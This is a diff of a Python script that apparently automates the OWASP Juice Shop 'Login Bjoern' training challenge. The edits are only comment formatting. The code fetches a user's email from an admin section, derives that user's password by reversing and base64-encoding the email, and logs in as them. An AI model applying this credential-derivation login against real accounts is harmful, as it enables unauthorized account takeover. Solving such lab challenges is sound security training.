@@ -20,14 +20,15 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 #---------------------------------------------------------------------------------------
 #Class: login_bjoern
 #Inherit: Attack
-#----------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
 class login_bjoern():
-#-----------------------------------------
+
+#--------------------------------------------------------------------------------------
 #FUNCTION: __init__ 
 #ARGUMENTS: N/A
 #RETURNS: void
 #Description: Initial class variables
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def __init__(self):
         # REST session
         self.juice_session = a.requests.session()
@@ -35,7 +36,7 @@ class login_bjoern():
         self.url = a.URL + '/rest/user/login'
         self.set_info()
 
-#-----------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION get_email
 #ARGUMENTS: N/A
 #RETURNS: if target's email is found return email address
@@ -43,7 +44,7 @@ class login_bjoern():
 #Description: get BJOERN's email address from Admin Section
 #             
 #NOTES:
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def get_email(self):
         dashboard = adSec.admin_section()
         response = dashboard.run()
@@ -55,7 +56,7 @@ class login_bjoern():
         #self.email = 'bjoern.kimminich@gmail.com' ### you can write a function to find this email
         return None
 
-#-----------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION btoa_pass
 #ARGUMENTS: N/A
 #RETURNS: user password
@@ -63,32 +64,32 @@ class login_bjoern():
 #             Decode BJOERN's password according to OAuth btoa function
 #             
 #NOTES:
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def btoa_pass(self, email):
         reverse_email = email[::-1]
         password = base64.b64encode(reverse_email.encode("latin1")).decode("utf8")
         return password
 
-#-----------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION btoa_pass
 #ARGUMENTS: N/A
 #RETURNS: N/A
 #Description: Set value for class variables
 #             
 #NOTES:
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def set_info(self):
         self.email = self.get_email()
         self.password = self.btoa_pass(self.email)
 
-#-----------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION generator
 #ARGUMENTS: N/A
 #RETURNS: json_data  --> will be embedded into POST request json field. 
 #Description: This function is used to generate needed data from REST requests
 #             
 #NOTES:
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def generator(self,):
         json_data = {
             'email': self.email,
@@ -96,14 +97,14 @@ class login_bjoern():
         }
         return json_data
 
-#-----------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION run
 #ARGUMENTS: N/A
 #RETURNS: N/A
 #Description: This is the main function for plugin to send REST requests.
 #             
 #NOTES: None
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def run(self):
         print('---------------------------------')
         print('Now let us to solve the Challenge Login Bjoern')
